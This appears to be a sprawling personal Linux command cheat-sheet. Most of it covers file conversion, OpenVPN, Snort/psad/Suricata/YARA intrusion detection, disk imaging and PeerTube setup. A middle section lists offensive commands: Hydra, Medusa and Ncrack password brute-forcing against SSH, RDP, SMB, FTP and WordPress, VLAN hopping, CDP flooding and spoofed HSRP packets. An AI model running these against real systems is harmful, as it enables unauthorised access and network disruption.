# Convert images to a multi-page pdf
convert -adjoin -page A4 *.jpeg $File.pdf



gm mogrify -format png *.webp		## Convert webp --> PNG
gm mogrify -format jpeg *.webp		## Convert webp --> JPEG
gm mogrify -format jpeg *.jpg		## Convert JPG --> JPEG
gm mogrify -format jpg *.png		## Convert PNG --> JPG
gm mogrify -format jpeg *.png		## Convert PNG --> JPEG
gm mogrify -format png *.jpeg		## Convert JPEG --> PNG
gm mogrify -format png *.jpg		## Convert JPG --> PNG

echo "##-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-##"
echo "    [+] Convert A Markdown Document To PDF:        "
echo "##-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-##"
pandoc -o $File.pdf $File.md


echo "##-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-##"
echo "    [+] Convert Docx to Markdown with Pandoc:"
echo "##-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-##"
pandoc -s $File.docx -t markdown -o $File.md


echo "##-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-##"
echo "    [+] Convert Text File --> PDF File:      "
echo "##-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-##"
pandoc $File.txt -o $File.pdf


echo "##-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-##"
echo "    [+] Convert Markdown File --> PDF File:      "
echo "##-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-##"
pandoc $File.md -s -o $Output.pdf				## create a PDF


echo "##-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-##"
echo "    [+] EPUB ebook --> PDF:"
echo "##-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-##"
pandoc $File.epub -o $File.pdf


echo "##-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-##"
echo "    [+] Convert HTML --> TEXT:         "
echo "##-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-##"
pandoc -s $File.html -o $File.txt


echo "##-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-##"
echo "    [+] Convert A Whole Directory of files from Markdown to RTF        "
echo "##-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-##"
for f in *.txt; do pandoc "$f" -s -o "${f%.txt}.rtf"; done


##-=============================================================-##
##   [+] use the native ATAPI interface which is found with:
##-=============================================================-##
cdrecord dev=ATAPI ‐scanbus


##-======================================-##
##   [+]
##-======================================-##
cdrecord ‐scanbus
cdrecord dev=ATAPI ‐scanbus


##-======================================-##
##   [+]
##-======================================-##
growisofs ‐dvd‐compat ‐Z /dev/dvd=$File.iso             ## Burn existing iso image
growisofs ‐dvd‐compat ‐Z /dev/dvd ‐J ‐R /p/to/data          ## Burn directly






##-======================================-##
##   [+]
##-======================================-##
pam-auth-update --enable libpam-net-usernet


##-======================================-##
##   [+]
##-======================================-##
for cipher in `openvpn --show-tls | grep TLS-`;
do echo $cipher;
openvpn --client --remote <TargetIP> --auth-user-pass --dev tun --ca ca.crt --auth-nocache --comp-lzo --tls-cipher $cipher;
done


openvpn --client --remote <TargetIP> --auth-user-pass login.conf --dev tun --ca ca.crt --auth-nocache --comp-lzo --tls-cipher <CorrectCipherSuite>

openvpn --client --remote <TargetIP> --auth-user-pass login.conf --dev tun --ca ca.crt --auth-nocache --comp-lzo --tls-cipher <CorrectCipherSuite>






Using tls-auth requires that you generate a shared-secret key

openvpn --genkey --secret ta.key


In the server configuration, add:

    tls-auth ta.key 0

In the client configuration, add:

    tls-auth ta.key 1




##-====================================-##
##   [+] client configuration file:
##-====================================-##
/etc/openvpn/client/corpvpn.conf


systemctl start openvpn-client@corpvpn


##-=============================================================-##
##   [+] view the server configurations journal
##   [+] only listing entries from yesterday and until today:
##-=============================================================-##
journalctl --since yesterday -u openvpn-server@tun0



##-============================================================-##
##   [+] view the OpenVPN journal log use a similar syntax:
##-============================================================-##
journalctl -u openvpn-client@$CONFIGNAME

journalctl -u openvpn-server@$CONFIGNAME



##-==============================================================-##
##  [+] Retrieve dropped connections from firewalld journaling
##-==============================================================-##
journalctl -b | grep -o "PROTO=.*" | sed -r 's/(PROTO|SPT|DPT|LEN)=//g' | awk '{print $1, $3}' | sort | uniq -c










##-=========================================-##
##						[+] sshuttle VPN:
##-=========================================-##
## ------------------------------------------------------- ##
##  git clone https://github.com/apenwarr/sshuttle
## ------------------------------------------------------- ##
##        [?] sshuttle VPN Inner Workings:
## ------------------------------------------------------- ##
##       > Disassembles TCP Packets,
##       > Sends Them Over SSH,
##       > ReAssembles & Forwards Packets,
## ------------------------------------------------------- ##
sshuttle -r $Username@$SSHServer 0/0



## ------------------------------------------------------------------ ##
##   [?]  Shuttle - Traffic forwarded over SSH:
## ------------------------------------------------------------------ ##
sshuttle -vr user@192.168.207.57 1X0.1X.0.0/16


mkdir /var/log/snort
chown root:snort /etc/snort/snort.conf
chmod 640 /etc/snort/snort.conf
sudo chown -R snort:snort /etc/snort
sudo chown -R snort:snort /var/log/snort


##-======================================================-##
##    [+]  system logger by sending it a SIGUSR1 signal
##-======================================================-##
kill -USR1 `pidof snort`


systemctl enable snort
systemctl enable barnyard2


##-=======================================-##
##   [+] Running Snort In Sniffer Mode:
##-=======================================-##
snort -e			##  print a summary of the
						##  link-level (Ethernet) headers



snort -i eth0 -vde

snort -dve -l $LogFile -c /etc/snort/snort.conf

snort -q -i eth0 -c -A console /etc/snort/snort.conf



snort -vQ -c /usr/local/etc/snort/snort-raj.conf -A fast -h 192.168.3.0/24 -s --daq ipfw --daq-var port=8100 --alert-before-pass

snort -A console -q -u snort -g snort -c /etc/snort/snort.conf -i eth0



snort -r $File.pcap -c /etc/snort/snort.read.conf -l .



/usr/sbin/snort -D -c /etc/snort/snort.conf -l /var/log/snort




Printing the pcap

snort --pcap-dir=/$Dir/$File.pcap --pcap-show







bro -r $File.pcap
snort -r $File.pcap -c /etc/snort.conf -l $LogFile



##-=======================================-##
##   [+] Running Snort In logging Mode:
##-=======================================-##
##-===================================-##
##   [+] Running snort with logging
##-===================================-##
snort -A fast -c /etc/snort/snort.conf -i eth0 -k none


##-===================================-##
##   [+]
##-===================================-##
tail -f /var/log/snort/alert


##-=========================================================-##
##    [+]  run as a network intrusion detection system,
##    [+]  binary logging, alerts sent to the system logger:
##-=========================================================-##
snort -c /usr/local/share/rules/snort.conf -b -s


##-===========================-##
##   [+]  Clone the PulledPork Repo:
##-===========================-##
git clone https://github.com/shirkdog/pulledpork.git


##-===========================-##
##   [+]
##-===========================-##
pulledpork.pl -c /etc/pulledpork/pulledpork.conf



sed -i "s/\/usr\/local\/etc\/snort\//\/etc\/snort\//g" /etc/snort/pulledpork.conf
sed -i "s/# enablesid=/enablesid=/g" /etc/snort/pulledpork.conf
sed -i "s/# dropsid=/enablesid=/g" /etc/snort/pulledpork.conf
sed -i "s/# disablesid=/enablesid=/g" /etc/snort/pulledpork.conf
sed -i "s/# modifysid=/enablesid=/g" /etc/snort/pulledpork.conf
sed -i "s/distro=FreeBSD-8-1/distro=Debian-8-4/g" /etc/snort/pulledpork.conf
sed -i "s/# out_path=/out_path=/g" /etc/snort/pulledpork.conf




bro-cut id.resp_p query


Output three columns and convert time values:
       cat conn.log | zeek-cut -d ts id.orig_h id.orig_p

       Output all columns and convert time values with a custom format string:
       cat conn.log | zeek-cut -D "%Y-%m-%d %H:%M:%S"

       Compressed logs must be uncompressed with another utility:
       zcat conn.log.gz | zeek-cut





Daemonlogger is a packet logger and soft tap
developed by Martin Roesch




##-===========================-##
##   [+]
##-===========================-##
fwsnort --update-rules



/usr/sbin/fwsnort
/usr/sbin/snort
/usr/sbin/snort-stat

/etc/fwsnort/fwsnort.conf

/etc/psad/psad.conf

/etc/oinkmaster.conf

/etc/sagan-rules/
/etc/sagan.conf

/etc/snort/rules/
/etc/snort/snort.conf







PsadfifoLog=$(cat /etc/rsyslog.conf | grep psadfifo)


if [ ! -e $PsadfifoLog ];then
	echo "Psadfifo Log Entry Exists!"
	$Psadfifo
else
	echo "kern.info			|/var/lib/psad/psadfifo" >> /etc/rsyslog.conf
fi



echo "would you like to update psad?"
echo -n "UpdatePsad?: "
read UpdatePsad

if [ $UpPsad = "yes" ]; then
	echo "Psad Signatures Updating..."
	psad --sig-update
	fwsnort --update-rules
else
	echo "OK. Psad Will Update Later..."
fi





if [ ! -e $PsadfifoLog ];then
	echo "Psadfifo Log Entry Exists!"
	$Psadfifo
else
	echo "kern.info			|/var/lib/psad/psadfifo" >> /etc/rsyslog.conf
fi



echo "would you like to update psad?"
echo -n "UpdatePsad?: "
read UpdatePsad

if [ $UpPsad = "yes" ]; then
	echo "Psad Signatures Updating..."
	psad --sig-update
	fwsnort --update-rules
else
	echo "OK. Psad Will Update Later..."
fi


psad --Status




Forensics Mode
psad -A


psad --debug



Apparmor profiles
aa-enforce usr.sbin.psad usr.sbin.fwsnort etc.fwsnort.fwsnort.sh











--config /etc/fwsnort/fwsnort.conf
--update-rules
--rules-url http://rules.emergingthreats.net/open/snort-2.9.0/emerging-all.rules
fwsnort --snort-rdir /etc/fwsnort/snort_rules
fwsnort --snort-rfile /etc/fwsnort/snort_rules/
fwsnort --snort-rfile /etc/fwsnort/snort_rules/community-rules/community.rules
--include-perl-triggers




--ipt-script
--ipt-check-capabilities
psad --fw-list
psad --Status
psad --fw-block-ip 144.202.X.X
psad --Flush
--ipt-apply
--ipt-list
--include-type ftp,mysql
--snort-conf
--snort-sid
--ipt-drop


--Ulog
--ulog-nlgroup

--logfile /var/log/fwsnort.log

--verbose

/etc/fwnort/fwsnort.conf
--ipt-script /var/lib/fwnort/fwsnort.sh

fwsnort --snort-sid 1834,2001842 --NFQUEUE --no-ipt-INPUT --no-ipt-OUTPUT



--Conntrack-state







fwsnort --ipt-sync --verbose

fwsnort --snort-sids 2001842 --ipt-drop

fwsnort --snort-sid 2281 --ipt-reset
fwsnort --snort-sid 900001 --ipt-reject
fwsnort --snort-sid 2002763 --ipt-reject
fwsnort --snort-sids 2001842 --ipt-drop
fwsnort --snort-sid 2281 --ipt-drop

fwsnort --snort-sid 2281 --ipt-reset

fwsnort --snort-sid 1332,1336,1338,1339,1341,1342,1360


grep -i metasploit /etc/fwsnort/fwsnort.sh

cp /etc/fwsnort/snort_rules/metasploit.rules /etc/psad/
snort_rules

echo "900001
4;" >> /etc/psad/snort_rule_dl













psad --sig-update

psad --Analyze-msgs

psad --status

psad --status-ip $IP

psad --status-summary

psad --debug

psad --config



/etc/init.d/psad start


psad --fw-dump


psad --fw-block-ip $IP


psad --fw-file $IPTablesRules


##-===============================================-##
##   [+]
##-===============================================-##
psad --fw-analyze



## ----------------------------------------------------------------------------------------------------------------------------------- ##
		psad --fw-list-auto
## ----------------------------------------------------------------------------------------------------------------------------------- ##
		psad --analysis-auto-block
## ----------------------------------------------------------------------------------------------------------------------------------- ##
		psad -A -m $IPTLogFile
## ----------------------------------------------------------------------------------------------------------------------------------- ##
		psad -A -m $IPTLogFile --analysis-fields src:$IP
## ----------------------------------------------------------------------------------------------------------------------------------- ##
		psad -c $PSADConfig -s $SigFile -a $AutoIPFile
## ----------------------------------------------------------------------------------------------------------------------------------- ##
		psad -c /etc/psad/psad.conf -s /etc/psad/signatures -a /etc/psad/auto_dl
## ----------------------------------------------------------------------------------------------------------------------------------- ##



##-===============================================-##
##   [+] Disable FW check
##   [+] Disable local port lookup subroutines
##-=====================COMMIT==========================-##
psad --log-server --no-netstat




## ----------------------------------------------------------------------------------------------------------------------------------- ##
		fwcheck_psad --fw-analyze					##  Analyze the local iptables ruleset
## ----------------------------------------------------------------------------------------------------------------------------------- ##
		fwcheck_psad --fw-file						## Allow the user to analyze a specific rulset
																	## from a file rather than the local policy
## ----------------------------------------------------------------------------------------------------------------------------------- ##




##-==========================================-##
##    [+] Specify path to the psad configuration file.
##    [?] By default this is /etc/psad/psad.conf
##-==========================================-##
fwcheck_psad --config /etc/psad/psad.conf





##-===============================================-##
##   [+] Print metadata associated to the rule
##-===============================================-##
yara --print-meta


##-===========================-##
##   [+] Print module data
##-===========================-##
yara --print-module-data


##-===============================================-##
##   [+] Print namespace associated to the rule
##-===============================================-##
yara --print-namespace/etc/snort/rules/


##-=================================-##
##   [+] Print rules statistics
##-=================================-##
yara --print-stats


##-========================================-##
##   [+] Print strings found in the file
##-========================================-##
yara --print-strings


##-==================================================-##
##   [+] Print length of strings found in the file
##-==================================================-##
yara --print-string-length


##-===============================================-##
##   [+] Print the tags associated to the rule
##-===============================================-##
yara --print-tags


##-===============================================-##
##   [+] Scan files in directories recursively
##-===============================================-##
yara --recursive


##-==============================================================-##
##   [+] RULES_FILE contains rules already compiled with yarac
##-==============================================================-##
yara --compiled-rules





##-===============================================-##
##   [+]
##-===============================================-##
Apply rules on /$Dir/rules
to all files on current directory.
Subdirectories are not scanned.
yara /$Dir/rules



##-=========================================================-##
##   [+] Apply rules on /foo/bar/rules to bazfile.
##   [+] Only reports rules tagged as Packer or Compiler.
##-=========================================================-##
yara -t Packer -t Compiler /$Dir/rules bazfile

              Apply rules on /foo/bar/rules to bazfile.  Only reports rules tagged as Packer or Compiler.

##-====================================================================-##
##   [+] Scan all files in the /foo directory and its subdirectories.
##   [+] Rules are read from standard input.
##-====================================================================-##
cat /$Dir/rules | yara -r /foo


##-=============================================================-##
##   [+] Defines three external variables $Var $Var and $Var.
##-=============================================================-##
yara -d $Var=true -d $Var=5 -d $Var="my string" /$Dir/rules bazfile


##-===============================================-##
##   [+]
##-===============================================-##
## ------------------------------------------------------------------------------ ##
##   [?] Apply rules on /foo/bar/rules to bazfile
##   [?] while passing the content of cuckoo_json_report to the cuckoo module.
## ------------------------------------------------------------------------------ ##
yara -x cuckoo=cuckoo_json_report /$Dir/rules bazfile





##-==========================================-##
##   [+] Run yardoc on all our lib files:
##-==========================================-##
yardoc lib/**/*.rb






##-===================-##
##   [+] Suricata
##-===================-##

/etc/suricata/   <--- Configuration Files
/etc/suricata/rules/  <--- Rules
/var/log/suricata/    <--- Log Files
/var/log/suricata/fast.log   <--- Log file with triggered rules


wget http://rules.emergingthreats.net/open/suricata/emerging.rules.tar.gz
tar zxvf emerging.rules.tar.gz
sudo mkdir /var/lib/suricata/
sudo mv rules /var/lib/suricata/



##-====================================-##
##   [+] edit suricata.yaml and find
##-====================================-##
default-rule-path: /var/lib/suricata/rules



##-=================================================================-##
##   [+] run Suricata against the network interface on your host.
##-=================================================================-##
sudo suricata -c /etc/suricata/suricata.yaml -i eth0




try running Suricata against a test pcap.
I found a pcap with the popular ETERNALBLUE exploit
from the Shadowbrokers / NSA episode.
You could just as easily try triggering Suricata alerts


suricata -c /etc/suricata/suricata.yaml -r ~/enternalblue.pcap
cat /var/log/suricata/fast.log



suricata -c /etc/suricata/suricata.yaml --init-errors-fatal










service xplico start
service xplico stop
xdg-open http://localhost:9876




volafox














##-=========================================================================-##
##	 [+] AES-256 Encrypted-To-Base64 Encoded Split Files {Crypto-KungFu}
##-=========================================================================-##

dd if=/dev/urandom of=/mnt/<Drive>/Encrypt bs=<size>M count=2

losetup -e AES256 /dev/loop0 /mnt/<Drive>/Encrypt

mkfs -t ext3 /dev/loop0

mkdir /mnt/<Drive2>

mount -t ext3 /dev/loop0 /mnt/<Drive2>

df -k

mount -t ext3 /mnt/Drive/Encrypt /mnt/<Drive2> -o loop=/dev/loop0,encryption=AES256

split --bytes=<Size> /mnt/<Drive>/Encrypt

cat xa* > Encrypt

mount -t ext3 /mnt/<Drive>/Encrypt /mnt/<Drive2> -o loop=/dev/loop0,encryption=AES256

uuencode -m xaa xaa.html > xaa.html
uuencode -m xab xab.html > xab.html

uudecode -o xaa xaa.html
uudevode -o xab xab.html















##-===============================================-##
##   [+]
##-===============================================-##
voiphopper -i eth0 -c 0


##-===================================================-##
##   [+] CDP Spoof Mode with custom packet (-c 1):
##-===================================================-##
-D (Device ID)
-P (Port ID)
-C (Capabilities)
-L (Platform)
-S (Software)
-U (Duplex)

voiphopper -i eth0 -c 1 -E 'SIP00070EEA5086' -P 'Port 1' -C Host -L 'Cisco IP Phone 7940' -S 'P003-08-8-00' -U 1



##-===================================================-##
##   [+] CDP Spoof Mode with pre-made packet (-c 2)
##-===================================================-##
voiphopper -i eth0 -c 2


##-=====================================-##
##   [+] Avaya DHCP Option Mode (-a):
##-=====================================-##
voiphopper -i eth0 -a


##-=====================================-##
##   [+] VLAN Hop Mode (-v VLAN ID):
##-=====================================-##
voiphopper -i eth0 -v 200


##-========================================-##
##   [+] Nortel DHCP Option Mode (-n):
##-========================================-##
voiphopper -i eth0 -n


##-===================================================-##
##   [+]
##-===================================================-##
voiphopper -i eth0 -v 20


##-===========================================-##
##   [+] Mode to specify the Voice VLAN ID
##-===========================================-##
ace -i eth0 -v 96 -m 00:1E:F7:28:9C:8E


##-==========================================================================-##
##   [+] Mode to auto-discover voice vlan ID in the listening mode for CDP
##-==========================================================================-##
ace -i eth0 -c 0 -m 00:1E:F7:28:9C:8E


##-==========================================================================-##
##   [+] Mode to auto-discover voice vlan ID in the spoofing mode for CDP
##-==========================================================================-##
ace -i eth0 -c 1 -m 00:1E:F7:28:9C:8E



##-===================================================================-##
##   [+]
##-===================================================================-##
ucsniff -i eth0.20 // //










hardening cisco routers - thomas akin




##-========================================================================-##
##   [+] Medusa - initiated against an htaccess protected web directory
##-========================================================================-##
medusa -h $IP -u admin -P $PassFile -M http -m DIR:/admin -T 10



##-=================================-##
##   [+] Ncrack - brute force RDP
##-=================================-##
ncrack -vv --user offsec -P $PassFile rdp://$ip




onesixtyone -c $Strings.txt 192.168.1.1


Hydra

hydra -t 2 -P $PassFile cisco
hydra -t 2 -m $Pass -P $Wordlist.txt cisco-enable


hydra -l $User -P $PassFile.txt -o $File.txt -t 1 -f 127.0.0.1 http-get-form "enviar.php:user=^USER^&pass=^PASS^:Algo esta errado"

hydra -l $User -P $PassFile.txt -o $File.txt -t 1 -f -w 15 127.0.0.1 http-post-form "/login/logar.php:user=^USER^&pass=^PASS^:S=Logado com sucesso"

hydra -l $User -P $PassFile.txt -o $File.txt -t 1 -f 127.0.0.1 http-post-form "/login/logar.php:user=^USER^&pass=^PASS^:Usuario ou senha invalida"

hydra -L users.txt -P $PassFile.txt -o $File.txt localhost http-head /colt/

hydra -l $User -P $PassFile.txt -w 15 localhost ftp



##-=================================-##
##   [+] Hydra - Bruteforce SNMP
##-=================================-##
hydra -P $PassFile.txt -v $IP snmp


##-===========================================-##
##   [+] Hydra - Bruteforce FTP known user
##-===========================================-##
hydra -t 1 -l $User -P /usr/share/wordlists/rockyou.txt -vV $IP ftp


##-====================================================-##
##   [+] Hydra SSH using list of users and passwords
##-====================================================-##
hydra -v -V -u -L $Users.txt -P $PassFile.txt -t 1 -u $IP ssh


##-=============================================================-##
##   [+] Hydra SSH using a known password and a username list
##-=============================================================-##
hydra -v -V -u -L $Users.txt -p "<known password>" -t 1 -u $IP ssh


##-====================================================-##
##   [+] Hydra SSH Against Known username on port 22
##-====================================================-##
hydra $IP -s 22 ssh -l $User -P $PassFile.txt


##-=================================-##
##   [+] Hydra - POP3 Brute Force
##-=================================-##
hydra -l $User -P $PassFile -f $IP pop3 -V


##-================================-##
##   [+] Hydra - SMTP Brute Force
##-================================-##
hydra -P $PassFile $IP smtp -V


##-=============================================================-##
##   [+] Hydra - attack http get 401 login with a dictionary
##-=============================================================-##
hydra -L ./webapp.txt -P $PassFile $IP http-get /admin


##-==========================================================-##
##   [+] Hydra attack Windows Remote Desktop with rockyou
##-==========================================================-##
hydra -t 1 -V -f -l $User -P /usr/share/wordlists/rockyou.txt rdp://$IP


##-=================================================-##
##   [+] Hydra brute force SMB user with rockyou:
##-=================================================-##
hydra -t 1 -V -f -l $User -P /usr/share/wordlists/rockyou.txt $IP smb


##-==================================================-##
##   [+] Hydra brute force a Wordpress admin login
##-==================================================-##
hydra -l $User -P $File.txt $IP -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'









##-=================================-##
##   [+] Cisco Global Exploiter
##-=================================-##
cge.pl -h 192.168.1.1 -v 7


##-===============================================-##
##   [+] Flood network with bogus CDP packets:
##-===============================================-##
cdp -i eth0 -m 0


##-=============================================================-##
##   [+] HSRP Generator - Send spoofed HSRP packets out eth0
##-=============================================================-##
with authword of cisco and group 1
spoofing virtual IP 192.168.1.25 to all routers on subnet

hsrp -d 224.0.0.2 -v 192.168.1.25 -a cisco -g 1 -i eth0



snmpset $IP private.1.3.6.1.4.1.9.2.1.55.171.68.191.135
router-config enterprises.9.2.1.55.192.168.0.25 = "router-config"



##-===========================================-##
##   [+] Enumerate IP adresses in a network
##-===========================================-##
netenum 192.168.1.0/27



##-==========================================-##
##   [+] send and ICMP timestamp request
##-==========================================-##
timestamp -d 192.168.1.1






##-=============================================-##
##   [+] IKE-Scan - scan in aggressive mode
##-=============================================-##
ike-scan -A 192.168.1.1 -v



##-==========================================================================-##
##   [+] Scan for all protocols in both active and passive modes via eth0:
##-==========================================================================-##
ass -A -i eth0


softflowd








chown debian-tor:debian-tor "$TORPIDDIR"

check_torpiddir () {
if test ! -d $TORPIDDIR; then
mkdir -m 02750 "$TORPIDDIR"
chown debian-tor:debian-tor "$TORPIDDIR"
fi
if test ! -x $TORPIDDIR; then
log_action_end_msg 1 "cannot access $TORPIDDIR directory, are you root?"
exit 1
fi
}










mkdir /var/log/privoxy/privoxy{2,3,4,5,6,7,8}
| awk -F ' ' '{print $1}'




refresh_pattern ^(ht|f)tp://.*ubuntu.*/Packages\.(bz2|gz|diff/Index)$ 0
refresh_pattern ^(ht|f)tp://.*ubuntu.*/Release(\.gpg)?$
0
refresh_pattern ^(ht|f)tp://.*ubuntu.*/Sources\.(bz2|gz|diff/Index)$
0
refresh_pattern ^(ht|f)tp://.*ubuntu.*/Translation-it\.bz2)$






##-=================================================-##
##   [+] Granting an additional user read access
##-=================================================-##
setfacl -m u:lisa:r file


##-====================================================================-##
##   [+] Revoking write access from all groups and all named  users
##-====================================================================-##
setfacl -m m::rx file


##-========================================================-##
##   [+] Removing a named group entry from a files ACL
##-========================================================-##
setfacl -x g:staff file


##-================================================-##
##   [+] Copying the ACL of one file to another
##-================================================-##
getfacl file1 | setfacl --set-file=- file2


##-=====================================================-##
##   [+] Copying the access ACL into the Default ACL
##-=====================================================-##
getfacl --access dir | setfacl -d -M- dir








$ # Basic installation
$ cd /var/www/peertube/peertube-latest
$ sudo -u peertube NODE_CONFIG_DIR=/var/www/peertube/config NODE_ENV=production npm run parse-log -- --level debug --not-tags http sql

$ # Docker installation
$ cd /var/www/peertube-docker
$ docker-compose exec -u peertube peertube npm run parse-log -- --level debug --not-tags http sql




# Docker installation
$ cd /var/www/peertube-docker
$ docker-compose exec -u peertube peertube npm run parse-log -- --level info





synchronize a Youtube channel to your PeerTube instance (ensure you have the agreement from the author), you can add a crontab rule (or an equivalent of your OS) and insert these rules (ensure to customize them to your needs):

# Update youtube-dl every day at midnight
0 0 * * * /usr/bin/npm rebuild youtube-dl --prefix /PATH/TO/PEERTUBE/

# Synchronize the YT channel every sunday at 22:00 all the videos published since last monday included
0 22 * * 0 /usr/bin/node /PATH/TO/PEERTUBE/dist/server/tools/peertube-import-videos.js -u '__PEERTUBE_URL__' -U '__USER__' --password '__PASSWORD__' --target-url 'https://www.youtube.com/channel/___CHANNEL__' --since $(date --date="-6 days" +\%Y-\%m-\%d)



peertube auth add -u 'PEERTUBE_URL' -U 'PEERTUBE_USER' --password 'PEERTUBE_PASSWORD'


peertube auth list
┌──────────────────────────────┬──────────────────────────────┐
│ instance                     │ login                        │
├──────────────────────────────┼──────────────────────────────┤
│ 'PEERTUBE_URL'               │ 'PEERTUBE_USER'              │
└──────────────────────────────┴──────────────────────────────┘

generate the first SSL/TLS certificate using Lets Encrypt:

mkdir -p docker-volume/certbot
docker run -it --rm --name certbot -p 80:80 -v "$(pwd)/docker-volume/certbot/conf:/etc/letsencrypt" certbot/certbot certonly --standalone

##  search the log output for your new PeerTubes instance admin credentials 
docker-compose logs peertube | grep -A1 root



Obtaining Your Automatically Generated DKIM DNS TXT Record
cat ./docker-volume/opendkim/keys/*/*.txt

##  peertube._domainkey.mydomain.tld.    IN    TXT    ( "v=DKIM1; h=sha256; k=rsa; "
##       "p=MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0Dx7wLGPFVaxVQ4TGym/eF89aQ8oMxS9v5BCc26Hij91t2Ci8Fl12DHNVqZoIPGm+9tTIoDVDFEFrlPhMOZl8i4jU9pcFjjaIISaV2+qTa8uV1j3MyByogG8pu4o5Ill7zaySYFsYB++cHJ9pjbFSC42dddCYMfuVgrBsLNrvEi3dLDMjJF5l92Uu8YeswFe26PuHX3Avr261n"
##       "j5joTnYwat4387VEUyGUnZ0aZxCERi+ndXv2/wMJ0tizq+a9+EgqIb+7lkUc2XciQPNuTujM25GhrQBEKznvHyPA6fHsFheymOuB763QpkmnQQLCxyLygAY9mE/5RY+5Q6J9oDOQIDAQAB" )  ; ----- DKIM key peertube for mydomain.tld


Create the production database and a peertube user inside PostgreSQL:

cd /var/www/peertube
sudo -u postgres createuser -P peertube

sudo -u postgres createdb -O peertube -E UTF8 -T template0 peertube_prod







gpg --no-armor -o canary.asc --default-sig-expire 183d --clearsign canary.txt





openssl s_client -connect "$1:443" 2>/dev/null | sed -ne '/-BEGIN CERTIFICATE-/,/-END CERTIFICATE-/p' | openssl x509 -text | grep "DNS:"| tr ',' '\n' | sed 's/\               //' | sed 's/\s//g' | sed 's/DNS://g'

subjects=$(echo -n | openssl s_client -connect "$1:443" 2>/dev/null | sed -ne '/-BEGIN CERTIFICATE-/,/-END CERTIFICATE-/p' | openssl x509 -text | grep "DNS:" | tr ',' '\n' | sed 's/\               //' | wc -l)
          









echo "----Creating QEMU Image----"
qemu-img create -f raw "${IMAGE}" 1G
chmod a+rw "${IMAGE}"

echo "----Creating Partition Table----"
echo -e "o\nn\np\n1\n\n\nw" | /sbin/fdisk "${IMAGE}"

echo "----Mounting QEMU Image----"
kpartx -a -s -v "${IMAGE}"
sleep 1

echo "----Creating Filesystem----"
mkfs.ext2 "${DEVICE}"
sync

echo "----Making QEMU Image Mountpoint----"
if [ ! -e "${IMAGE_DIR}" ]; then
    mkdir "${IMAGE_DIR}"
    chown "${USER}" "${IMAGE_DIR}"
fi

echo "----Mounting QEMU Image Partition 1----"
mount "${DEVICE}" "${IMAGE_DIR}"




echo "----Unmounting QEMU Image----"
sync
umount "${DEVICE}"
kpartx -d "${IMAGE}"
losetup -d "${DEVICE}" &>/dev/null
dmsetup remove $(basename "$DEVICE") &>/dev/null
































qemu-img info $File.vmdk


VBoxManage clonehd --format VDI $File.vmdk $File.vdi


guestmount -o allow_other -a "$raw_file_short_link" -m /dev/sda1 --ro "$mount_folder"


kpartx -a -s -v "$img" 2>&1




# VirtualBox resize a hard drive image.
#
# This does two steps:
#
#   1. Clone a VMDK file format disk to a VDI file format disk.
#   2. Modify the VDI file format disk by using resize.
#
# Syntax:
#
#     VBoxManage-clone-from-vmdk-to-vdi-then-resize <src> <dst> <megabytes>
#
# Example:
#
#     VBoxManage-clone-from-vmdk-to-vdi-then-resize My.vmdk My.vdi 10000
#
# Contact: Joel Parker Henderson (joel@joelparkerhenderson.com)
# License: GPL
# Updated: 2015-01-25
##

src=$1
dst=$2
megabytes=$3

VBoxManage clonehd "$src" "$dst" –format vdi
VBoxManage modifyhd "$dst" --resize "$megabytes"





##-=============================-##
##   [+] convert vdi to vmdk
##-=============================-##
## ------------------------------------------------------------------------- ##
##   [?] virtualbox v3.2 hard disk conversion to vmware hard disk format
## ------------------------------------------------------------------------- ##
vboxmanage clonehd --format VMDK $SrcImage|$UUID $DstImage


##-========================================-##
##   [+] Clone or rescue a block device
##-========================================-##
ddrescue -v /dev/sda /dev/sdb logfile.log



echo "## ==================================================================== ##"
echo "## ==========  ========== ##"
echo "## ==================================================================== ##"
sudo dd if=/dev/sdb of=/mnt/recovery/$File.dd


echo "## ==================================================================== ##"
echo "## ==== dd will abort on error. Avoid this with the noerror option ==== ##"
echo "## ==================================================================== ##"
sudo dd conv=noerror if=/dev/sdb of=/mnt/recovery/$File.dd


echo "## ==================================================================== ##"
echo "## ============= grab most of the error-free areas ==================== ##"
echo "## ==================================================================== ##"
gddrescue -n /dev/sdb /mnt/recovery/$File.raw rescued.log


echo "## ==================================================================== ##"
echo "## ====== Once you have your bit-for-bit copy, run fsck on it: ======== ##"
echo "## ==================================================================== ##"
fsck /mnt/recovery/$File.dd


echo "## ==================================================================== ##"
echo "## ============ mount the image as a loopback device: ================= ##"
echo "## ==================================================================== ##"
mount -o loop /mnt/recovery/$File.dd /mnt/hdaimage


echo "## ==================================================================== ##"
echo "## ========= Find out where the partitions are with this: ============= ##"
echo "## ==================================================================== ##"
fdisk -lu /mnt/recovery/$File.dd


echo "## =============================================================================== ##"
echo "## Which will list the start and end cylinders of each partition and the units in  ##"
echo "## Which they’re measured. If the second partition starts at cylinder 80300 and    ##"
echo "## The Units are 512 bytes, then that partition starts at 80300 × 512 = 41,113,600 ##"
echo "## 		bytes. In this case, the command you want looks like this: 				 ##"
echo "## =============================================================================== ##"
mount -o loop,offset=41113600 /mnt/recover/$File.raw /mnt/$Dir

echo "## ==================================================================== ##"
echo "## ============== Write The Image Back onto Another Disk ============== ##"
echo "## ==================================================================== ##"
